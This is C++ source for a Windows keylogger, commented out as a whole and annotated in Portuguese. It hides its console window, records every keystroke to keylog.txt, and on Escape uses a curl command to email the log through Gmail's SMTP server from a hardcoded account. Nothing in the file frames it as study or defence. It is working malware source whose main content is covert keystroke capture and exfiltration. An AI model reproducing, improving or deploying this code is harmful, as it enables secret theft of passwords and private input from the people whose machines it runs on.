/*
#define _CRT_SECURE_NO_WARNINGS


#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>
#include <cstdlib>



// Função para ocultar o console
void hideConsole() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE); // Oculta a janela do console
}

// Função para registrar as teclas
void logKey(int key, bool shiftPressed, bool ctrlPressed) {
    std::ofstream logFile;
    logFile.open("keylog.txt", std::ios::app);

    if (ctrlPressed && key == 'C') {
        logFile << " [CTRL+C] ";
    }
    else if (shiftPressed && key >= 0x30 && key <= 0x39) {
        const char shiftedSymbols[] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };
        logFile << shiftedSymbols[key - 0x30];
    }
    else if (key == VK_SPACE) {
        logFile << " [SPACE] ";
    }
    else if (key == VK_RETURN) {
        logFile << " [ENTER] ";
    }
    else if (key == VK_TAB) {
        logFile << " [TAB] ";
    }
    else if (key == VK_BACK) {
        logFile << " [BACKSPACE] ";
    }
    else if (key >= 0x30 && key <= 0x5A) {
        logFile << (shiftPressed ? char(key) : char(tolower(key)));
    }
    else {
        logFile << " [UNKNOWN] ";
    }

    logFile.close();
}

// Função para enviar o arquivo por email (com credenciais seguras)
void sendEmail() {
    const char* password = getenv("EMAIL_PASSWORD"); // Variável de ambiente
    if (password == nullptr) {
        std::cerr << "Erro: Variável de ambiente EMAIL_PASSWORD não definida!" << std::endl;
        return;
    }

    std::string command = "curl --url \"smtps://smtp.gmail.com:465\" --ssl-reqd "
        "--mail-from \"shopify171rs@gmail.com\" "
        "--mail-rcpt \"destinatario@gmail.com\" "
        "--upload-file keylog.txt "
        "--user \"shopify171rs@gmail.com:" + std::string(password) + "\"";
    system(command.c_str());
}

int main() {
    hideConsole(); // Oculta o console

    bool shiftPressed = false, ctrlPressed = false;

    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x0001) { // Verifica se a tecla foi pressionada
                shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
                ctrlPressed = (GetAsyncKeyState(VK_CONTROL) & 0x8000);

                logKey(key, shiftPressed, ctrlPressed);
            }
        }

        // Opção de saída: Pressione ESC para encerrar o programa
        if (GetAsyncKeyState(VK_ESCAPE) & 0x0001) {
            sendEmail();
            break;
        }

        Sleep(10); // Pequena pausa
    }

    return 0;
}

*/